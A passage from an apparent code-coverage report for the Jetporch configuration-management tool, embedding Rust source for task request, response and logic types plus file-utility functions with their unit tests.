has an evaluated Attributes section, the mode will be stored as an octal string like \"777\", but we need\n    // an integer for some internal APIs like the SSH connection put requests.\n\n    /*\n    pub fn get_numeric_mode(response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, this: \u0026Option\u003cSelf\u003e) -\u003e Result\u003cOption\u003ci32\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        return match this.is_some() {\n            true =\u003e {\n                let mode = \u0026this.as_ref().unwrap().mode;\n                match mode {\n                    Some(x) =\u003e {\n                        let value = FileAttributesInput::octal_string_to_number(response, \u0026request, \u0026x)?;\n                        return Ok(Some(value));\n                    },\n                    None =\u003e Ok(None)\n                }\n            },\n            false =\u003e Ok(None),\n        };\n    }\n    */\n\n}","traces":[{"line":52,"address":[],"length":0,"stats":{"Line":35}},{"line":53,"address":[],"length":0,"stats":{"Line":35}},{"line":55,"address":[],"length":0,"stats":{"Line":35}},{"line":56,"address":[],"length":0,"stats":{"Line":18}},{"line":57,"address":[],"length":0,"stats":{"Line":17}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}}],"covered":5,"coverable":30},{"path":["/","Users","wings","projects","jetpack","src","tasks","logic.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::request::TaskRequest;\nuse std::sync::Arc;\nuse crate::tasks::response::TaskResponse;\nuse serde::Deserialize;\nuse crate::handle::template::BlendTarget;\nuse crate::playbooks::templar::TemplateMode;\n\n// this is storage behind all 'and' and 'with' statements in the program, which\n// are mostly implemented in task_fsm\n\n#[derive(Deserialize,Debug,Clone)]\n#[serde(deny_unknown_fields)]\npub struct PreLogicInput {\n    pub condition: Option\u003cString\u003e,\n    pub subscribe: Option\u003cString\u003e,\n    pub sudo: Option\u003cString\u003e,\n    pub items: Option\u003cItemsInput\u003e,\n    pub tags: Option\u003cVec\u003cString\u003e\u003e,\n    pub delegate_to: Option\u003cString\u003e\n}\n\n#[derive(Deserialize,Debug,Clone)]\n#[serde(untagged)]\npub enum ItemsInput {\n    ItemsString(String),\n    ItemsList(Vec\u003cString\u003e),\n}\n\n#[derive(Debug)]\npub struct PreLogicEvaluated {\n    pub condition: Option\u003cString\u003e, // this is not evaluated here\n    pub subscribe: Option\u003cString\u003e,\n    pub sudo: Option\u003cString\u003e,\n    pub items: Option\u003cItemsInput\u003e,\n    pub tags: Option\u003cVec\u003cString\u003e\u003e\n}\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct PostLogicInput {\n    pub notify: Option\u003cString\u003e,\n    pub ignore_errors: Option\u003cString\u003e,\n    pub retry: Option\u003cString\u003e,\n    pub delay: Option\u003cString\u003e\n}\n\n#[derive(Debug)]\npub struct PostLogicEvaluated {\n    pub notify: Option\u003cString\u003e,\n    pub ignore_errors: bool,\n    pub retry: u64,\n    pub delay: u64,\n}\n\n\nimpl PreLogicInput {\n\n    pub fn template(handle: \u0026TaskHandle, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, input: \u0026Option\u003cSelf\u003e) -\u003e Result\u003cOption\u003cPreLogicEvaluated\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        if input.is_none() {\n            return Ok(None);\n        }\n        let input2 = input.as_ref().unwrap();\n        return Ok(Some(PreLogicEvaluated {\n            condition: input2.condition.clone(),\n            sudo: handle.template.string_option_no_spaces(request, tm, \u0026String::from(\"sudo\"), \u0026input2.sudo)?,\n            subscribe: handle.template.no_template_string_option_trim(\u0026input2.subscribe),\n            items: input2.items.clone(),\n            tags: input2.tags.clone()\n        }));\n    }\n\n}\n\nimpl PostLogicInput {\n\n    pub fn template(handle: \u0026TaskHandle, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, input: \u0026Option\u003cSelf\u003e) -\u003e Result\u003cOption\u003cPostLogicEvaluated\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        if input.is_none() {\n            return Ok(None);\n        }\n        let input2 = input.as_ref().unwrap();\n        return Ok(Some(PostLogicEvaluated {\n            notify: handle.template.string_option_trim(request, tm, \u0026String::from(\"notify\"), \u0026input2.notify)?,\n            // unsafe here means the options cannot be sent to the shell, which they are not.\n            delay:         handle.template.integer_option_to_integer(request, tm, \u0026String::from(\"delay\"), \u0026input2.delay, 1)?,\n            ignore_errors: handle.template.boolean_option_default_false(request, tm, \u0026String::from(\"ignore_errors\"), \u0026input2.ignore_errors)?,\n            retry:         handle.template.integer_option_to_integer(request, tm, \u0026String::from(\"retry\"), \u0026input2.retry, 0)?,\n        }));\n    }\n}\n\n/* this is called from the task_fsm, not above */\npub fn template_items(handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, items_input: \u0026Option\u003cItemsInput\u003e) \n    -\u003e Result\u003cVec\u003cserde_yaml::Value\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n    return match items_input {\n\n        None =\u003e Ok(empty_items_vector()),\n        \n        // with/items: varname\n        Some(ItemsInput::ItemsString(x)) =\u003e {\n            let blended = handle.run_state.context.read().unwrap().get_complete_blended_variables(\n                \u0026handle.host, \n                BlendTarget::NotTemplateModule\n            );\n            match blended.contains_key(\u0026x) {\n                true =\u003e {\n                    let value : serde_yaml::Value = blended.get(\u0026x).unwrap().clone();\n                    match value {\n                        serde_yaml::Value::Sequence(vs) =\u003e template_serde_sequence(handle, request, tm, vs),\n                        _ =\u003e {\n                            return Err(handle.response.is_failed(request, \u0026format!(\"with/items variable did not resolve to a list\")));\n                        }\n                    }\n                }, \n                false =\u003e {\n                    return Err(handle.response.is_failed(request, \u0026format!(\"variable not found for items: {}\", x)))\n                }\n            }\n        },\n        Some(ItemsInput::ItemsList(x)) =\u003e {\n            let mut output : Vec\u003cserde_yaml::Value\u003e = Vec::new();\n            for item in x.iter() {\n                output.push(serde_yaml::Value::String(handle.template.string(request, tm, \u0026String::from(\"items\"), item)?));\n            }\n            Ok(output)\n        }\n    }\n}\n\npub fn empty_items_vector() -\u003e Vec\u003cserde_yaml::Value\u003e {\n    return vec![serde_yaml::Value::Bool(true)];\n}\n\npub fn template_serde_sequence(\n    handle: \u0026TaskHandle, \n    request: \u0026Arc\u003cTaskRequest\u003e, \n    tm: TemplateMode,\n    vs: serde_yaml::Sequence) \n    -\u003e Result\u003cVec\u003cserde_yaml::Value\u003e,Arc\u003cTaskResponse\u003e\u003e {\n\n    let mut output : Vec\u003cserde_yaml::Value\u003e = Vec::new();\n\n    for seq_item in vs.iter() {\n\n        match seq_item {   \n            serde_yaml::Value::String(x) =\u003e {\n                output.push(serde_yaml::Value::String(handle.template.string(request, tm, \u0026String::from(\"items\"), x)?))\n            },\n            x =\u003e { output.push(x.clone()) }\n        }\n    }\n    return Ok(output);\n}\n","traces":[{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":1}},{"line":148,"address":[],"length":0,"stats":{"Line":1}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}}],"covered":2,"coverable":47},{"path":["/","Users","wings","projects","jetpack","src","tasks","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod request;\npub mod response;\npub mod common;\npub mod logic;\npub mod files;\npub mod fields;\npub mod cmd_library;\npub mod checksum;\n\npub use crate::connection::command::cmd_info;\npub use crate::tasks::common::{IsTask,IsAction,EvaluatedTask};\npub use crate::tasks::logic::{PreLogicInput,PreLogicEvaluated,PostLogicInput,PostLogicEvaluated};\npub use crate::handle::handle::{TaskHandle,CheckRc};\npub use crate::tasks::response::{TaskResponse,TaskStatus};\npub use crate::tasks::request::{TaskRequestType,TaskRequest};\npub use crate::tasks::files::{FileAttributesInput,FileAttributesEvaluated};\npub use crate::tasks::fields::Field;\npub use crate::playbooks::templar::TemplateMode;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","tasks","request.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n//use std::collections::HashMap;\nuse std::sync::Arc;\nuse crate::tasks::fields::Field;\nuse std::vec::Vec;\n\n// task requests are objects given to modules (and the task FSM) that\n// describe what questions we are asking of them. In the case of \n// modifications, this includes the list (map) of parameters to change\n// as returned by the query request\n\n#[derive(Debug,PartialEq)]\npub enum TaskRequestType {\n    Validate,\n    Query,\n    Create,\n    Remove,\n    Modify,\n    Execute,\n    Passive,\n}\n\n#[derive(Debug)]\npub struct TaskRequest {\n    pub request_type: TaskRequestType,\n    pub changes: Vec\u003cField\u003e,\n    pub sudo_details: Option\u003cSudoDetails\u003e\n}\n\n#[derive(Debug,PartialEq,Clone)]\npub struct SudoDetails {\n    pub user: Option\u003cString\u003e,\n    pub template: String\n}\n\n// most of the various methods in task requests are constructors for different TaskRequest type variants\n// as used by task_fsm.rs. \n\nimpl TaskRequest {\n\n    pub fn validate() -\u003e Arc\u003cSelf\u003e {\n        return Arc::new(\n            Self { \n                request_type: TaskRequestType::Validate, \n                changes: Vec::new(),\n                sudo_details: None\n            }\n        )\n    }\n\n    pub fn query(sudo_details: \u0026SudoDetails) -\u003e Arc\u003cSelf\u003e {\n        return Arc::new(\n            Self { \n                request_type: TaskRequestType::Query, \n                changes: Vec::new(),\n                sudo_details: Some(sudo_details.clone())\n            }\n        )\n    }\n\n    pub fn create(sudo_details: \u0026SudoDetails) -\u003e Arc\u003cSelf\u003e {\n        return Arc::new(\n            Self { \n                request_type: TaskRequestType::Create, \n                changes: Vec::new(),\n                sudo_details: Some(sudo_details.clone())\n            }\n        )\n    }\n\n    pub fn remove(sudo_details: \u0026SudoDetails) -\u003e Arc\u003cSelf\u003e {\n        return Arc::new(\n            Self { \n                request_type: TaskRequestType::Remove, \n                changes: Vec::new(),\n                sudo_details: Some(sudo_details.clone())\n            }\n        )\n    }\n\n    pub fn modify(sudo_details: \u0026SudoDetails, changes: Vec\u003cField\u003e) -\u003e Arc\u003cSelf\u003e {\n        return Arc::new(\n            Self { \n                request_type: TaskRequestType::Modify, \n                changes: changes,\n                sudo_details: Some(sudo_details.clone())\n            }\n        )\n    }\n\n    pub fn execute(sudo_details: \u0026SudoDetails) -\u003e Arc\u003cSelf\u003e {\n        return Arc::new(\n            Self { \n                request_type: TaskRequestType::Execute, \n                changes: Vec::new(),\n                sudo_details: Some(sudo_details.clone())\n            }\n        )\n    }\n\n    pub fn passive(sudo_details: \u0026SudoDetails) -\u003e Arc\u003cSelf\u003e {\n        return Arc::new(\n            Self { \n                request_type: TaskRequestType::Passive, \n                changes: Vec::new(),\n                sudo_details: Some(sudo_details.clone())\n            }\n        )\n    }\n\n    pub fn is_sudoing(\u0026self) -\u003e bool {\n        let sudo_details = \u0026self.sudo_details;\n        if sudo_details.is_none() || sudo_details.as_ref().unwrap().user.is_none() {\n            return false\n        }\n        return true;\n    }\n\n}","traces":[{"line":56,"address":[],"length":0,"stats":{"Line":2}},{"line":57,"address":[],"length":0,"stats":{"Line":2}},{"line":58,"address":[],"length":0,"stats":{"Line":2}},{"line":59,"address":[],"length":0,"stats":{"Line":2}},{"line":60,"address":[],"length":0,"stats":{"Line":2}},{"line":61,"address":[],"length":0,"stats":{"Line":2}},{"line":66,"address":[],"length":0,"stats":{"Line":3}},{"line":67,"address":[],"length":0,"stats":{"Line":3}},{"line":68,"address":[],"length":0,"stats":{"Line":3}},{"line":69,"address":[],"length":0,"stats":{"Line":3}},{"line":70,"address":[],"length":0,"stats":{"Line":3}},{"line":71,"address":[],"length":0,"stats":{"Line":3}},{"line":76,"address":[],"length":0,"stats":{"Line":1}},{"line":77,"address":[],"length":0,"stats":{"Line":1}},{"line":78,"address":[],"length":0,"stats":{"Line":1}},{"line":79,"address":[],"length":0,"stats":{"Line":1}},{"line":80,"address":[],"length":0,"stats":{"Line":1}},{"line":81,"address":[],"length":0,"stats":{"Line":1}},{"line":86,"address":[],"length":0,"stats":{"Line":1}},{"line":87,"address":[],"length":0,"stats":{"Line":1}},{"line":88,"address":[],"length":0,"stats":{"Line":1}},{"line":89,"address":[],"length":0,"stats":{"Line":1}},{"line":90,"address":[],"length":0,"stats":{"Line":1}},{"line":91,"address":[],"length":0,"stats":{"Line":1}},{"line":96,"address":[],"length":0,"stats":{"Line":1}},{"line":97,"address":[],"length":0,"stats":{"Line":1}},{"line":98,"address":[],"length":0,"stats":{"Line":1}},{"line":99,"address":[],"length":0,"stats":{"Line":1}},{"line":100,"address":[],"length":0,"stats":{"Line":1}},{"line":101,"address":[],"length":0,"stats":{"Line":1}},{"line":106,"address":[],"length":0,"stats":{"Line":1}},{"line":107,"address":[],"length":0,"stats":{"Line":1}},{"line":108,"address":[],"length":0,"stats":{"Line":1}},{"line":109,"address":[],"length":0,"stats":{"Line":1}},{"line":110,"address":[],"length":0,"stats":{"Line":1}},{"line":111,"address":[],"length":0,"stats":{"Line":1}},{"line":116,"address":[],"length":0,"stats":{"Line":1}},{"line":117,"address":[],"length":0,"stats":{"Line":1}},{"line":118,"address":[],"length":0,"stats":{"Line":1}},{"line":119,"address":[],"length":0,"stats":{"Line":1}},{"line":120,"address":[],"length":0,"stats":{"Line":1}},{"line":121,"address":[],"length":0,"stats":{"Line":1}},{"line":126,"address":[],"length":0,"stats":{"Line":3}},{"line":127,"address":[],"length":0,"stats":{"Line":3}},{"line":128,"address":[],"length":0,"stats":{"Line":5}},{"line":129,"address":[],"length":0,"stats":{"Line":2}},{"line":131,"address":[],"length":0,"stats":{"Line":1}}],"covered":47,"coverable":47},{"path":["/","Users","wings","projects","jetpack","src","tasks","response.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::sync::Arc;\n//use std::collections::HashMap;\nuse crate::connection::command::CommandResult;\nuse crate::tasks::logic::{PreLogicEvaluated,PostLogicEvaluated};\nuse crate::tasks::fields::Field;\nuse std::vec::Vec;\n\n// task responses are returns from module calls - they are not\n// created directly but by helper functions in handle.rs, see\n// the various modules for examples/usage\n\n#[derive(Debug,PartialEq)]\npub enum TaskStatus {\n    IsCreated,\n    IsRemoved,\n    IsModified,\n    IsExecuted,\n    IsPassive,\n    IsMatched,\n    IsSkipped,\n    NeedsCreation,\n    NeedsRemoval,\n    NeedsModification,\n    NeedsExecution,\n    NeedsPassive,\n    Failed\n}\n\n#[derive(Debug)]\npub struct TaskResponse {\n    pub status: TaskStatus,\n    pub changes: Vec\u003cField\u003e,\n    pub msg: Option\u003cString\u003e,\n    pub command_result: Arc\u003cOption\u003cCommandResult\u003e\u003e,\n    pub with: Arc\u003cOption\u003cPreLogicEvaluated\u003e\u003e,\n    pub and: Arc\u003cOption\u003cPostLogicEvaluated\u003e\u003e\n}\n\n//impl TaskResponse {\n//}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","util","io.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::fs;\nuse std::path::{Path};\nuse std::fs::ReadDir;\nuse std::os::unix::fs::PermissionsExt;\nuse std::process;\nuse std::io::Read;\n\n// read a directory as per the normal rust way, but map any errors to strings\npub fn jet_read_dir(path: \u0026Path) -\u003e Result\u003cReadDir, String\u003e {\n    return fs::read_dir(path).map_err(\n        |_x| format!(\"failed to read directory: {}\", path.display())\n    )\n}\n\n// call fn on each path in a subdirectory of the original path, each step is allowed\n// to return an error to stop the walking.\npub fn path_walk\u003cF\u003e(path: \u0026Path, mut with_each_path: F) -\u003e Result\u003c(), String\u003e \n   where F: FnMut(\u0026Path) -\u003e Result\u003c(), String\u003e {\n    let read_result = jet_read_dir(path);\n    for entry in read_result.unwrap() {\n        with_each_path(\u0026entry.unwrap().path())?;\n    }\n    Ok(())\n}\n\n// open a file per the normal rust way, but map any errors to strings\npub fn jet_file_open(path: \u0026Path) -\u003e Result\u003cstd::fs::File, String\u003e {\n    return std::fs::File::open(path).map_err(\n        |_x| format!(\"unable to open file: {}\", path.display())\n    );\n}\n\npub fn read_local_file(path: \u0026Path) -\u003e Result\u003cString,String\u003e {\n    let mut file = jet_file_open(path)?;\n    let mut buffer = String::new();\n    let read_result = file.read_to_string(\u0026mut buffer);\n    match read_result {\n        Ok(_) =\u003e {},\n        Err(x) =\u003e {\n            return Err(format!(\"unable to read file: {}, {:?}\", path.display(), x));\n        }\n    };\n    return Ok(buffer.clone());\n}\n\n// get the last part of the file ignoring the directory part\npub fn path_basename_as_string(path: \u0026Path) -\u003e String {\n    return path.file_name().unwrap().to_str().unwrap().to_string();\n}\n\n// get the last part of the file ignoring the directory part\npub fn path_as_string(path: \u0026Path) -\u003e String {\n    return path.to_str().unwrap().to_string();\n}\n\npub fn directory_as_string(path: \u0026Path) -\u003e String {\n    return path.parent().unwrap().to_str().unwrap().to_string();\n}\n\npub fn quit(s: \u0026String) {\n    // quit with a message - don't use this except in main.rs!\n    println!(\"{}\", s); \n    process::exit(0x01)\n}\n\npub fn is_executable(path: \u0026Path) -\u003e bool {\n    let metadata = match fs::metadata(path) {\n        Ok(x) =\u003e x, Err(_) =\u003e return false,\n    };\n    let permissions = metadata.permissions();\n    if ! metadata.is_file() {\n        return false;\n    }\n    let mode_bits = permissions.mode() \u0026 0o111;\n    if mode_bits == 0 {\n        return false;\n    }\n    return true;\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::fs::{self, File};\n    use std::io::Write;\n    use tempfile::TempDir;\n    use std::os::unix::fs::PermissionsExt;\n\n    #[test]\n    fn test_jet_read_dir_success() {\n        let temp_dir = TempDir::new().unwrap();\n        let path = temp_dir.path();\n        \n        // Create some files in the directory\n        File::create(path.join(\"file1.txt\")).unwrap();\n        File::create(path.join(\"file2.txt\")).unwrap();\n        \n        let result = jet_read_dir(path);\n        assert!(result.is_ok());\n        \n        let entries: Vec\u003c_\u003e = result.unwrap().collect();\n        assert_eq!(entries.len(), 2);\n    }\n\n    #[test]\n    fn test_jet_read_dir_failure() {\n        let non_existent = Path::new(\"/non/existent/directory\");\n        let result = jet_read_dir(non_existent);\n        \n        assert!(result.is_err());\n        assert!(result.unwrap_err().contains(\"failed to read directory\"));\n    }\n\n    #[test]\n    fn test_path_walk_success() {\n        let temp_dir = TempDir::new().unwrap();\n        let path = temp_dir.path();\n        \n        // Create some files\n        File::create(path.join(\"file1.txt\")).unwrap();\n        File::create(path.join(\"file2.txt\")).unwrap();\n        File::create(path.join(\"file3.txt\")).unwrap();\n        \n        let mut count = 0;\n        let result = path_walk(path, |_p| {\n            count += 1;\n            Ok(())\n        });\n        \n        assert!(result.is_ok());\n        assert_eq!(count, 3);\n    }\n\n    #[test]\n    fn test_path_walk_with_error() {\n        let temp_dir = TempDir::new().unwrap();\n        let path = temp_dir.path();\n        \n        File::create(path.join(\"file1.txt\")).unwrap();\n        File::create(path.join(\"file2.txt\")).unwrap();\n        \n        let mut count = 0;\n        let result = path_walk(path, |_p| {\n            count += 1;\n            if count == 1 {\n                Err(\"Stop walking\".to_string())\n            } else {\n                Ok(())\n            }\n        });\n        \n        assert!(result.is_err());\n        assert_eq!(result.unwrap_err(), \"Stop walking\");\n        assert_eq!(count, 1);\n    }\n\n    #[test]\n    fn test_jet_file_open_success() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"test.txt\");\n        File::create(\u0026file_path).unwrap();\n        \n        let result = jet_file_open(\u0026file_path);\n        assert!(result.is_ok());\n    }\n\n    #[test]\n    fn test_jet_file_open_failure() {\n        let non_existent = Path::new(\"/non/existent/file.txt\");\n        let result = jet_file_open(non_existent);\n        \n        assert!(result.is_err());\n        assert!(result.unwrap_err().contains(\"unable to open file\"));\n    }\n\n    #[test]\n    fn test_read_local_file_success() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"test.txt\");\n        let mut file = File::create(\u0026file_path).unwrap();\n        writeln!(file, \"Test content\").unwrap();\n        writeln!(file, \"Second line\").unwrap();\n        \n        let result = read_local_file(\u0026file_path);\n        assert!(result.is_ok());\n        \n        let content = result.unwrap();\n        assert!(content.contains(\"Test content\"));\n        assert!(content.contains(\"Second line\"));\n    }\n\n    #[test]\n    fn test_read_local_file_failure() {\n        let non_existent = Path::new(\"/non/existent/file.txt\");\n        let result = read_local_file(non_existent);\n        \n        assert!(result.is_err());\n        assert!(result.unwrap_err().contains(\"unable to open file\"));\n    }\n\n    #[test]\n    fn test_path_basename_as_string() {\n        let path = Path::new(\"/home/user/documents/file.txt\");\n        let basename = path_basename_as_string(path);\n        assert_eq!(basename, \"file.txt\");\n        \n        let path2 = Path::new(\"simple.txt\");\n        let basename2 = path_basename_as_string(path2);\n        assert_eq!(basename2, \"simple.txt\");\n    }\n\n    #[test]\n    fn test_path_as_string() {\n        let path = Path::new(\"/home/user/file.txt\");\n        let path_str = path_as_string(path);\n        assert_eq!(path_str, \"/home/user/file.txt\");\n    }\n\n    #[test]\n    fn test_directory_as_string() {\n        let path = Path::new(\"/home/user/documents/file.txt\");\n        let dir = directory_as_string(path);\n        assert_eq!(dir, \"/home/user/documents\");\n        \n        let path2 = Path::new(\"/file.txt\");\n        let dir2 = directory_as_string(path2);\n        assert_eq!(dir2, \"/\");\n    }\n\n    #[test]\n    fn test_is_executable_regular_file() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"script.sh\");\n        let file = File::create(\u0026file_path).unwrap();\n        \n        // Initially not executable\n        assert!(!is_executable(\u0026file_path));\n        \n        // Make it executable\n        let mut perms = file.metadata().unwrap().permissions();\n        perms.set_mode(0o755);\n        fs::set_permissions(\u0026file_path, perms).unwrap();\n        \n        assert!(is_executable(\u0026file_path));\n    }\n\n    #[test]\n    fn test_is_executable_non_executable_file() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"regular.txt\");\n        let file = File::create(\u0026file_path).unwrap();\n        \n        // Set permissions to read/write only\n        let mut perms = file.metadata().unwrap().permissions();\n        perms.set_mode(0o644);\n        fs::set_permissions(\u0026file_path, perms).unwrap();\n        \n        assert!(!is_executable(\u0026file_path));\n    }\n\n    #[test]\n    fn test_is_executable_directory() {\n        let temp_dir = TempDir::new().unwrap();\n        let dir_path = temp_dir.path().join(\"subdir\");\n        fs::create_dir(\u0026dir_path).unwrap();\n        \n        // Directories should return false even with execute bit\n        assert!(!is_executable(\u0026dir_path));\n    }\n\n    #[test]\n    fn test_is_executable_non_existent() {\n        let non_existent = Path::new(\"/non/existent/file\");\n        assert!(!is_executable(non_existent));\n    }\n\n    // Note: test_quit is omitted because it calls process::exit which\n    // interferes with test runners and coverage 